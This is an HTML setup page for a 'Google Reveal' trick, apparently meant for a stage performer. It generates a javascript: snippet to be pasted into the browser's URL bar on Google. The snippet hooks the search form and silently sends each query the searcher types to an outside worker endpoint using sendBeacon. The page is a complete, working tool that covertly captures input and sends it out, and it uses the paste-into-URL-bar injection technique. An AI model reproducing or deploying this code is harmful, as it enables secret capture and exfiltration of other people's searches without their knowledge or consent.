<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Reveal | Setup</title>
    <style>
        :root { --accent: #4285F4; --bg: #000; }
        body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        h1 { font-weight: 200; letter-spacing: 4px; font-size: 1.1rem; margin-bottom: 40px; color: #888; }
        .setup-zone { margin-bottom: 40px; text-align: center; max-width: 300px; }
        label { display: block; font-size: 0.65rem; text-transform: uppercase; color: #444; margin-bottom: 15px; letter-spacing: 2px; }
        p { font-size: 0.8rem; color: #666; line-height: 1.5; }
        .btn { background: #fff; color: #000; padding: 20px; border-radius: 18px; font-size: 0.9rem; font-weight: 700; border: none; cursor: pointer; width: 280px; letter-spacing: 1px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #confirm { margin-top: 25px; font-size: 0.7rem; color: var(--accent); font-weight: 600; text-transform: uppercase; opacity: 0; transition: 0.3s; }
    </style>
</head>
<body>

    <h1>GOOGLE REVEAL</h1>
    <div class="setup-zone">
        <label>PROTOCOL STATUS</label>
        <p>This will copy the interceptor to your clipboard. Once on Google, paste it into the URL bar.</p>
    </div>
    <button class="btn" onclick="engage()">GENERATE INTERCEPTOR</button>
    <div id="confirm">Payload Copied</div>

    <script>
        function engage() {
            // Change this to your actual worker URL
            const workerUrl = 'https://google-reveal.avishaierel.workers.dev/api/save';

            const payload = `javascript:(function(){
                const endpoint = '${workerUrl}';
                const searchInput = document.querySelector('textarea[name="q"]') || document.querySelector('input[name="q"]');
                const form = searchInput ? searchInput.closest('form') : null;

                if (form) {
                    form.addEventListener('submit', function() {
                        const q = searchInput.value.trim();
                        if (q) {
                            // Using sendBeacon to ensure data is sent before page navigates away
                            navigator.sendBeacon(endpoint, new URLSearchParams({ q }));
                        }
                    }, { capture: true });
                    
                    // Visual confirmation for the performer
                    searchInput.style.boxShadow = '0 0 10px #4285F4';
                    console.log('Reveal Active');
                } else {
                    alert('Error: Search bar not found.');
                }
            })();`;

            navigator.clipboard.writeText(payload.replace(/\s+/g, ' ')).then(() => {
                document.getElementById('confirm').style.opacity = "1";
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            });
        }
    </script>
</body>
</html>
